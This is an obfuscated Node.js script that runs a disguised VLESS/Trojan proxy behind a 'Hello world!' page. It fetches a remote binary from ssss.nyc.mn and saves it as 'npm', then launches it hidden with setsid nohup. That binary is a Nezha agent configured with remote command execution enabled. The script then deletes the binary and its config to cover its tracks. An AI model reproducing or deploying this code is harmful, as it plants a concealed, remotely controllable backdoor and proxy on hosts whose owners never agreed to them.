const _0xdbd51c=_0x4ab3;(function(_0x199f9f,_0x140ef0){const _0x557ce7={_0x40d08f:0xe7,_0x11f718:0x124,_0x3d7ccf:0x10c,_0x413488:0x105,_0x520db8:0xbc},_0x1ad8ee=_0x4ab3,_0x566dde=_0x199f9f();while(!![]){try{const _0xa21e2e=parseInt(_0x1ad8ee(_0x557ce7._0x40d08f))/0x1*(-parseInt(_0x1ad8ee(_0x557ce7._0x11f718))/0x2)+parseInt(_0x1ad8ee(0x125))/0x3+-parseInt(_0x1ad8ee(0xbe))/0x4+-parseInt(_0x1ad8ee(_0x557ce7._0x3d7ccf))/0x5*(parseInt(_0x1ad8ee(0xf3))/0x6)+parseInt(_0x1ad8ee(0xb9))/0x7*(parseInt(_0x1ad8ee(0xfd))/0x8)+parseInt(_0x1ad8ee(_0x557ce7._0x413488))/0x9+parseInt(_0x1ad8ee(_0x557ce7._0x520db8))/0xa*(parseInt(_0x1ad8ee(0xca))/0xb);if(_0xa21e2e===_0x140ef0)break;else _0x566dde['push'](_0x566dde['shift']());}catch(_0xaf81c1){_0x566dde['push'](_0x566dde['shift']());}}}(_0x1631,0xf1783));const os=require('os'),http=require(_0xdbd51c(0x138)),fs=require('fs'),axios=require(_0xdbd51c(0x112)),net=require(_0xdbd51c(0xda)),path=require(_0xdbd51c(0xcf)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0xdbd51c(0xf0)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xdbd51c(0xbb)][_0xdbd51c(0x10d)]||_0xdbd51c(0x117),NEZHA_SERVER=process[_0xdbd51c(0xbb)][_0xdbd51c(0x116)]||'',NEZHA_PORT=process['env'][_0xdbd51c(0xdd)]||'',NEZHA_KEY=process[_0xdbd51c(0xbb)][_0xdbd51c(0x10f)]||'',DOMAIN=process['env'][_0xdbd51c(0xf5)]||'1234.abc.com',AUTO_ACCESS=process[_0xdbd51c(0xbb)][_0xdbd51c(0x128)]||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0xdbd51c(0xbb)]['SUB_PATH']||_0xdbd51c(0xec),NAME=process[_0xdbd51c(0xbb)][_0xdbd51c(0xc1)]||'',PORT=process[_0xdbd51c(0xbb)][_0xdbd51c(0x126)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x328355={_0x378104:0x12d,_0x40feb9:0x127,_0x49e768:0x11e},_0x5b1347=_0xdbd51c;try{const _0xc507=await axios[_0x5b1347(_0x328355._0x378104)](_0x5b1347(0x133)),_0x2b109d=_0xc507['data'];ISP=(_0x2b109d[_0x5b1347(_0x328355._0x40feb9)]+'-'+_0x2b109d[_0x5b1347(_0x328355._0x49e768)])['replace'](/ /g,'_');}catch(_0x6b98af){ISP=_0x5b1347(0x122);}};function _0x4ab3(_0x30d256,_0x611f4d){const _0x1631ed=_0x1631();return _0x4ab3=function(_0x4ab32e,_0x5d28f4){_0x4ab32e=_0x4ab32e-0xb6;let _0x40cd17=_0x1631ed[_0x4ab32e];return _0x40cd17;},_0x4ab3(_0x30d256,_0x611f4d);}GetISP();const httpServer=http[_0xdbd51c(0xb8)]((_0x4a5f6a,_0x3294a6)=>{const _0x2c1475={_0x373d81:0xef,_0x4ebd18:0xc4,_0x2df5f8:0xf2,_0x4c49c6:0xc7,_0x907d0:0xef,_0x5530a0:0x123,_0x57edb1:0xea,_0x2b82af:0xdc,_0xd1b92e:0xe0,_0x101c6f:0xea,_0x132d9b:0x129,_0x9b5902:0x135,_0x900fd0:0xc2,_0x5bac:0xc2,_0x5c54f3:0xf1},_0x5769d2={_0x4b1401:0xe2,_0x2574d2:0xf8,_0x3dcf27:0xe4},_0x222bdb=_0xdbd51c;if(_0x4a5f6a[_0x222bdb(_0x2c1475._0x373d81)]==='/'){const _0x10be04=path[_0x222bdb(_0x2c1475._0x4ebd18)](__dirname,_0x222bdb(_0x2c1475._0x2df5f8));fs[_0x222bdb(0xde)](_0x10be04,_0x222bdb(_0x2c1475._0x4c49c6),(_0xb27bd6,_0x2ec97c)=>{const _0x581056=_0x222bdb;if(_0xb27bd6){_0x3294a6[_0x581056(0xe4)](0xc8,{'Content-Type':_0x581056(_0x5769d2._0x4b1401)}),_0x3294a6[_0x581056(0xc2)](_0x581056(_0x5769d2._0x2574d2));return;}_0x3294a6[_0x581056(_0x5769d2._0x3dcf27)](0xc8,{'Content-Type':_0x581056(_0x5769d2._0x4b1401)}),_0x3294a6['end'](_0x2ec97c);});return;}else{if(_0x4a5f6a[_0x222bdb(_0x2c1475._0x907d0)]==='/'+SUB_PATH){const _0x274eac=NAME?NAME+'-'+ISP:ISP,_0x4e6337=_0x222bdb(_0x2c1475._0x5530a0)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x222bdb(0x106)+DOMAIN+_0x222bdb(_0x2c1475._0x57edb1)+WSPATH+'#'+_0x274eac,_0x3ce775=_0x222bdb(_0x2c1475._0x2b82af)+UUID+'@'+DOMAIN+_0x222bdb(_0x2c1475._0xd1b92e)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x222bdb(_0x2c1475._0x101c6f)+WSPATH+'#'+_0x274eac,_0x2eb2d5=_0x4e6337+'\x0a'+_0x3ce775,_0x2c1157=Buffer[_0x222bdb(_0x2c1475._0x132d9b)](_0x2eb2d5)[_0x222bdb(_0x2c1475._0x9b5902)](_0x222bdb(0xcc));_0x3294a6['writeHead'](0xc8,{'Content-Type':_0x222bdb(0xed)}),_0x3294a6[_0x222bdb(_0x2c1475._0x900fd0)](_0x2c1157+'\x0a');}else _0x3294a6[_0x222bdb(0xe4)](0x194,{'Content-Type':_0x222bdb(0xed)}),_0x3294a6[_0x222bdb(_0x2c1475._0x5bac)](_0x222bdb(_0x2c1475._0x5c54f3));}}),wss=new WebSocket[(_0xdbd51c(0xbf))]({'server':httpServer}),uuid=UUID[_0xdbd51c(0xc9)](/-/g,''),DNS_SERVERS=[_0xdbd51c(0xf9),'1.1.1.1'];function resolveHost(_0x8c79c7){const _0x57096b={_0x53d1cb:0xdb};return new Promise((_0x594143,_0x33a0c5)=>{const _0x2a86ae=_0x4ab3;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2a86ae(0xe1)](_0x8c79c7)){_0x594143(_0x8c79c7);return;}let _0x3946f7=0x0;function _0x258972(){const _0x20c7fa={_0x2c760f:0x10e},_0xefdc92=_0x2a86ae;if(_0x3946f7>=DNS_SERVERS[_0xefdc92(0xe3)]){_0x33a0c5(new Error(_0xefdc92(0xeb)+_0x8c79c7+_0xefdc92(_0x57096b._0x53d1cb)));return;}const _0x47492f=DNS_SERVERS[_0x3946f7];_0x3946f7++;const _0x10d2d3=_0xefdc92(0xd3)+encodeURIComponent(_0x8c79c7)+'&type=A';axios[_0xefdc92(0x12d)](_0x10d2d3,{'timeout':0x1388,'headers':{'Accept':_0xefdc92(0xd0)}})[_0xefdc92(0x118)](_0x2376a7=>{const _0x26fb85=_0xefdc92,_0x406408=_0x2376a7[_0x26fb85(0xb6)];if(_0x406408[_0x26fb85(0xb7)]===0x0&&_0x406408['Answer']&&_0x406408[_0x26fb85(0x10e)]['length']>0x0){const _0x4d67bb=_0x406408[_0x26fb85(_0x20c7fa._0x2c760f)][_0x26fb85(0xc5)](_0x308407=>_0x308407[_0x26fb85(0x12f)]===0x1);if(_0x4d67bb){_0x594143(_0x4d67bb['data']);return;}}_0x258972();})[_0xefdc92(0x11c)](_0x48c926=>{_0x258972();});}_0x258972();});}function handleVlessConnection(_0x3cb01b,_0x2322ef){const _0x1b50a4={_0x4161a9:0xc8,_0x49e87b:0x107,_0x2dd9ae:0x107,_0x2961db:0xcd,_0x47e3ac:0x11c},_0x574ff9={_0x5836c4:0xd2},_0x5ee56a={_0x5727cf:0xf7,_0x3666e9:0x132},_0x596e2b=_0xdbd51c,[_0x4c7eaf]=_0x2322ef,_0x3ad08c=_0x2322ef[_0x596e2b(0x107)](0x1,0x11);if(!_0x3ad08c[_0x596e2b(_0x1b50a4._0x4161a9)]((_0x138996,_0x31e56d)=>_0x138996==parseInt(uuid[_0x596e2b(0xce)](_0x31e56d*0x2,0x2),0x10)))return![];let _0x44c40f=_0x2322ef[_0x596e2b(0x107)](0x11,0x12)[_0x596e2b(0xcd)]()+0x13;const _0x31c1a9=_0x2322ef[_0x596e2b(_0x1b50a4._0x49e87b)](_0x44c40f,_0x44c40f+=0x2)[_0x596e2b(0x103)](0x0),_0x72f6ea=_0x2322ef[_0x596e2b(0x107)](_0x44c40f,_0x44c40f+=0x1)[_0x596e2b(0xcd)](),_0x1926eb=_0x72f6ea==0x1?_0x2322ef[_0x596e2b(_0x1b50a4._0x2dd9ae)](_0x44c40f,_0x44c40f+=0x4)['join']('.'):_0x72f6ea==0x2?new TextDecoder()[_0x596e2b(0x136)](_0x2322ef[_0x596e2b(0x107)](_0x44c40f+0x1,_0x44c40f+=0x1+_0x2322ef['slice'](_0x44c40f,_0x44c40f+0x1)[_0x596e2b(_0x1b50a4._0x2961db)]())):_0x72f6ea==0x3?_0x2322ef[_0x596e2b(_0x1b50a4._0x2dd9ae)](_0x44c40f,_0x44c40f+=0x10)[_0x596e2b(0xc3)]((_0x207899,_0x1fb1e7,_0x52d601,_0x4e2479)=>_0x52d601%0x2?_0x207899[_0x596e2b(0x115)](_0x4e2479['slice'](_0x52d601-0x1,_0x52d601+0x1)):_0x207899,[])[_0x596e2b(0x101)](_0x3627c3=>_0x3627c3[_0x596e2b(0x103)](0x0)[_0x596e2b(0x135)](0x10))[_0x596e2b(0xc4)](':'):'';_0x3cb01b[_0x596e2b(0xc0)](new Uint8Array([_0x4c7eaf,0x0]));const _0x4a0f83=createWebSocketStream(_0x3cb01b);return resolveHost(_0x1926eb)['then'](_0x35b2b1=>{const _0x5bade6={_0x68ec85:0x107,_0x38ba25:0x132};net['connect']({'host':_0x35b2b1,'port':_0x31c1a9},function(){const _0x4afa91=_0x4ab3;this['write'](_0x2322ef[_0x4afa91(_0x5bade6._0x68ec85)](_0x44c40f)),_0x4a0f83['on'](_0x4afa91(_0x5bade6._0x38ba25),()=>{})[_0x4afa91(0xd7)](this)['on']('error',()=>{})[_0x4afa91(0xd7)](_0x4a0f83);})['on']('error',()=>{});})[_0x596e2b(_0x1b50a4._0x47e3ac)](_0x2466d3=>{const _0x3894f3=_0x596e2b;net[_0x3894f3(_0x574ff9._0x5836c4)]({'host':_0x1926eb,'port':_0x31c1a9},function(){const _0x18a999=_0x3894f3;this[_0x18a999(_0x5ee56a._0x5727cf)](_0x2322ef['slice'](_0x44c40f)),_0x4a0f83['on'](_0x18a999(0x132),()=>{})[_0x18a999(0xd7)](this)['on'](_0x18a999(_0x5ee56a._0x3666e9),()=>{})['pipe'](_0x4a0f83);})['on'](_0x3894f3(0x132),()=>{});}),!![];}function _0x1631(){const _0x1f0190=['4XLJEzR','3834816JyHEtw','PORT','country_code','AUTO_ACCESS','from','utf-8','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','listen','get','npm\x20is\x20running','type','finish','2096','error','https://api.ip.sb/geoip','Automatic\x20Access\x20Task\x20added\x20successfully','toString','decode','log','http','https://arm64.ssss.nyc.mn/agent','data','Status','createServer','9095849kixtZj','arm64','env','10paPwcO','https://oooo.serv00.net/add-url','4767308NYtVgL','Server','send','NAME','end','reduce','join','find','once','utf8','every','replace','30705928VjuhMG','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','base64','readUInt8','substr','path','application/dns-json','connection','connect','https://dns.google/resolve?name=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://amd64.ssss.nyc.mn/v1','config.yaml','pipe','sha224','client_secret:\x20','net','\x20with\x20all\x20DNS\x20servers','trojan://','NEZHA_PORT','readFile','Server\x20is\x20running\x20on\x20port\x20',':443?security=tls&sni=','test','text/html','length','writeHead','https://','pop','787099qETnYt','post','npm\x20is\x20already\x20running,\x20skip\x20running...','&path=%2F','Failed\x20to\x20resolve\x20','sub','text/plain','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','url','child_process','Not\x20Found\x0a','index.html','154218yVlbGo','hex','DOMAIN','/bin/bash','write','Hello\x20world!','8.8.4.4','npm','error:\x20','close','8ghseUW','arm','443','unlink','map','createHash','readUInt16BE','https://amd64.ssss.nyc.mn/agent','509868IuPfWU','&fp=chrome&type=ws&host=','slice','2083','aarch64','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2087','325JIlwhC','UUID','Answer','NEZHA_KEY','8443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','axios','digest','npm\x20running\x20error:','concat','NEZHA_SERVER','c771c684-6d72-4122-9dca-a01ae5139077','then','writeFileSync','2053','split','catch','includes','isp','message','stream','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Unknown','vless://'];_0x1631=function(){return _0x1f0190;};return _0x1631();}function handleTrojanConnection(_0x511238,_0x10fbf8){const _0x205432={_0xbf15ff:0xe3,_0xeeb131:0x135,_0x3b97b8:0x102,_0x396e53:0x113,_0x35920b:0x107,_0x1db94f:0xc3,_0x3ddbd2:0x101,_0x358572:0xc4,_0x1758d2:0x118,_0x285804:0x11c},_0xa46f72={_0x384d69:0x132},_0x3bb917={_0x1ee0ca:0xf7,_0x1e7644:0x107,_0x405750:0x132},_0x318466={_0x2cc3b8:0xd2},_0x32dd01={_0x11ee1d:0xe3,_0x5b2d1:0xf7,_0x5ab401:0x107},_0x2402b8=_0xdbd51c;try{if(_0x10fbf8[_0x2402b8(_0x205432._0xbf15ff)]<0x3a)return![];const _0x58b606=_0x10fbf8[_0x2402b8(0x107)](0x0,0x38)[_0x2402b8(_0x205432._0xeeb131)](),_0x3bf3f4=[UUID];let _0x11e673=null;for(const _0x19637d of _0x3bf3f4){const _0x25d5f9=crypto[_0x2402b8(_0x205432._0x3b97b8)](_0x2402b8(0xd8))['update'](_0x19637d)[_0x2402b8(_0x205432._0x396e53)](_0x2402b8(0xf4));if(_0x25d5f9===_0x58b606){_0x11e673=_0x19637d;break;}}if(!_0x11e673)return![];let _0x2bb6aa=0x38;_0x10fbf8[_0x2bb6aa]===0xd&&_0x10fbf8[_0x2bb6aa+0x1]===0xa&&(_0x2bb6aa+=0x2);const _0x44e2ae=_0x10fbf8[_0x2bb6aa];if(_0x44e2ae!==0x1)return![];_0x2bb6aa+=0x1;const _0x504354=_0x10fbf8[_0x2bb6aa];_0x2bb6aa+=0x1;let _0xb2ef8c,_0x4e3f0d;if(_0x504354===0x1)_0xb2ef8c=_0x10fbf8[_0x2402b8(_0x205432._0x35920b)](_0x2bb6aa,_0x2bb6aa+0x4)['join']('.'),_0x2bb6aa+=0x4;else{if(_0x504354===0x3){const _0x4c94ef=_0x10fbf8[_0x2bb6aa];_0x2bb6aa+=0x1,_0xb2ef8c=_0x10fbf8[_0x2402b8(0x107)](_0x2bb6aa,_0x2bb6aa+_0x4c94ef)[_0x2402b8(_0x205432._0xeeb131)](),_0x2bb6aa+=_0x4c94ef;}else{if(_0x504354===0x4)_0xb2ef8c=_0x10fbf8['slice'](_0x2bb6aa,_0x2bb6aa+0x10)[_0x2402b8(_0x205432._0x1db94f)]((_0x27559c,_0x44d664,_0x1788ca,_0x3d9370)=>_0x1788ca%0x2?_0x27559c['concat'](_0x3d9370['slice'](_0x1788ca-0x1,_0x1788ca+0x1)):_0x27559c,[])[_0x2402b8(_0x205432._0x3ddbd2)](_0x2142bd=>_0x2142bd['readUInt16BE'](0x0)['toString'](0x10))[_0x2402b8(_0x205432._0x358572)](':'),_0x2bb6aa+=0x10;else return![];}}_0x4e3f0d=_0x10fbf8[_0x2402b8(0x103)](_0x2bb6aa),_0x2bb6aa+=0x2;_0x2bb6aa<_0x10fbf8[_0x2402b8(_0x205432._0xbf15ff)]&&_0x10fbf8[_0x2bb6aa]===0xd&&_0x10fbf8[_0x2bb6aa+0x1]===0xa&&(_0x2bb6aa+=0x2);const _0x3a324d=createWebSocketStream(_0x511238);return resolveHost(_0xb2ef8c)[_0x2402b8(_0x205432._0x1758d2)](_0x17520f=>{const _0x4d3fd2=_0x2402b8;net[_0x4d3fd2(_0x318466._0x2cc3b8)]({'host':_0x17520f,'port':_0x4e3f0d},function(){const _0x545dee=_0x4d3fd2;_0x2bb6aa<_0x10fbf8[_0x545dee(_0x32dd01._0x11ee1d)]&&this[_0x545dee(_0x32dd01._0x5b2d1)](_0x10fbf8[_0x545dee(_0x32dd01._0x5ab401)](_0x2bb6aa)),_0x3a324d['on'](_0x545dee(0x132),()=>{})[_0x545dee(0xd7)](this)['on'](_0x545dee(0x132),()=>{})[_0x545dee(0xd7)](_0x3a324d);})['on'](_0x4d3fd2(0x132),()=>{});})[_0x2402b8(_0x205432._0x285804)](_0x5ca53f=>{const _0x1dcc2b=_0x2402b8;net[_0x1dcc2b(0xd2)]({'host':_0xb2ef8c,'port':_0x4e3f0d},function(){const _0x18cb2a=_0x1dcc2b;_0x2bb6aa<_0x10fbf8[_0x18cb2a(0xe3)]&&this[_0x18cb2a(_0x3bb917._0x1ee0ca)](_0x10fbf8[_0x18cb2a(_0x3bb917._0x1e7644)](_0x2bb6aa)),_0x3a324d['on']('error',()=>{})[_0x18cb2a(0xd7)](this)['on'](_0x18cb2a(_0x3bb917._0x405750),()=>{})[_0x18cb2a(0xd7)](_0x3a324d);})['on'](_0x1dcc2b(_0xa46f72._0x384d69),()=>{});}),!![];}catch(_0x48943e){return![];}}wss['on'](_0xdbd51c(0xd1),(_0x59c171,_0x6c3de6)=>{const _0x23dbbc={_0x16fb51:0xc6},_0x250f48={_0x1b5225:0xe3,_0x126b23:0x107,_0x3ac1c6:0xfc,_0x31e387:0xfc},_0x1f111c=_0xdbd51c,_0x142a9e=_0x6c3de6['url']||'';_0x59c171[_0x1f111c(_0x23dbbc._0x16fb51)](_0x1f111c(0x11f),_0x4930ee=>{const _0x153af2=_0x1f111c;if(_0x4930ee[_0x153af2(_0x250f48._0x1b5225)]>0x11&&_0x4930ee[0x0]===0x0){const _0x1b2034=_0x4930ee[_0x153af2(_0x250f48._0x126b23)](0x1,0x11),_0x426c42=_0x1b2034[_0x153af2(0xc8)]((_0x31360d,_0x240ca0)=>_0x31360d==parseInt(uuid[_0x153af2(0xce)](_0x240ca0*0x2,0x2),0x10));if(_0x426c42){!handleVlessConnection(_0x59c171,_0x4930ee)&&_0x59c171[_0x153af2(_0x250f48._0x3ac1c6)]();return;}}!handleTrojanConnection(_0x59c171,_0x4930ee)&&_0x59c171[_0x153af2(_0x250f48._0x31e387)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x3b90a1={_0x43bc33:0x109,_0x535332:0x139,_0x1b85fc:0x104},_0x15b0e3=_0xdbd51c,_0x35f0c9=os['arch']();return _0x35f0c9===_0x15b0e3(0xfe)||_0x35f0c9===_0x15b0e3(0xba)||_0x35f0c9===_0x15b0e3(_0x3b90a1._0x43bc33)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x15b0e3(_0x3b90a1._0x535332):!NEZHA_PORT?_0x15b0e3(0xd5):_0x15b0e3(_0x3b90a1._0x1b85fc);},downloadFile=async()=>{const _0x1a410f={_0x1e1a9b:0x12d,_0x25836b:0x120},_0x4c72ff={_0xa35d37:0x130,_0x366bee:0x132},_0x25747a=_0xdbd51c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x564300=getDownloadUrl(),_0x49b427=await axios({'method':_0x25747a(_0x1a410f._0x1e1a9b),'url':_0x564300,'responseType':_0x25747a(_0x1a410f._0x25836b)}),_0x3c2ce6=fs['createWriteStream'](_0x25747a(0xfa));return _0x49b427['data']['pipe'](_0x3c2ce6),new Promise((_0x52f2c7,_0x2091b4)=>{const _0x53ce93=_0x25747a;_0x3c2ce6['on'](_0x53ce93(_0x4c72ff._0xa35d37),()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x586dff=>{if(_0x586dff)_0x2091b4(_0x586dff);_0x52f2c7();});}),_0x3c2ce6['on'](_0x53ce93(_0x4c72ff._0x366bee),_0x2091b4);});}catch(_0x4f7b5c){throw _0x4f7b5c;}},runnz=async()=>{const _0x8270c9={_0x8b6500:0x137,_0x12a759:0xe9,_0x5792c3:0xff,_0x34341c:0x131,_0x1ad59a:0x10b,_0x37c53e:0x11d,_0x2138b7:0x111,_0x57fa85:0x12b,_0x2118a3:0xd4,_0x13c92f:0xd6,_0x283189:0xf6,_0x37d293:0x132,_0x3a3217:0xfb},_0x549c84=_0xdbd51c;try{const _0x59982c=execSync(_0x549c84(0x121),{'encoding':_0x549c84(0x12a)});if(_0x59982c['trim']()!==''){console[_0x549c84(_0x8270c9._0x8b6500)](_0x549c84(_0x8270c9._0x12a759));return;}}catch(_0x5c8556){}await downloadFile();let _0x18d542='',_0x29671d=[_0x549c84(_0x8270c9._0x5792c3),_0x549c84(0x110),_0x549c84(_0x8270c9._0x34341c),_0x549c84(_0x8270c9._0x1ad59a),_0x549c84(0x108),_0x549c84(0x11a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2f9b3f=_0x29671d[_0x549c84(0x11d)](NEZHA_PORT)?'--tls':'';_0x18d542='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2f9b3f+_0x549c84(0x10a);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x24ab47=NEZHA_SERVER[_0x549c84(_0x8270c9._0x37c53e)](':')?NEZHA_SERVER[_0x549c84(0x11b)](':')[_0x549c84(0xe6)]():'',_0x329271=_0x29671d[_0x549c84(0x11d)](_0x24ab47)?'true':'false',_0x1576a1=_0x549c84(0xd9)+NEZHA_KEY+_0x549c84(_0x8270c9._0x2138b7)+NEZHA_SERVER+_0x549c84(_0x8270c9._0x57fa85)+_0x329271+_0x549c84(_0x8270c9._0x2118a3)+UUID;fs[_0x549c84(0x119)](_0x549c84(_0x8270c9._0x13c92f),_0x1576a1);}_0x18d542=_0x549c84(0xee);}else{console[_0x549c84(0x137)](_0x549c84(0xcb));return;}}try{exec(_0x18d542,{'shell':_0x549c84(_0x8270c9._0x283189)},_0x1680cd=>{const _0x3dc6d8=_0x549c84;if(_0x1680cd)console['error'](_0x3dc6d8(0x114),_0x1680cd);else console[_0x3dc6d8(0x137)](_0x3dc6d8(0x12e));});}catch(_0x29b39f){console[_0x549c84(_0x8270c9._0x37d293)](_0x549c84(_0x8270c9._0x3a3217)+_0x29b39f);}};async function addAccessTask(){const _0x558795={_0x27b309:0xe8},_0x40d31e=_0xdbd51c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2fe0e2=_0x40d31e(0xe5)+DOMAIN;try{const _0x1595cd=await axios[_0x40d31e(_0x558795._0x27b309)](_0x40d31e(0xbd),{'url':_0x2fe0e2},{'headers':{'Content-Type':'application/json'}});console['log'](_0x40d31e(0x134));}catch(_0x3860ee){}}const delFiles=()=>{const _0x30332c=_0xdbd51c;fs['unlink'](_0x30332c(0xfa),()=>{}),fs[_0x30332c(0x100)]('config.yaml',()=>{});};httpServer[_0xdbd51c(0x12c)](PORT,()=>{const _0x36ffee=_0xdbd51c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x36ffee(0xdf)+PORT);});
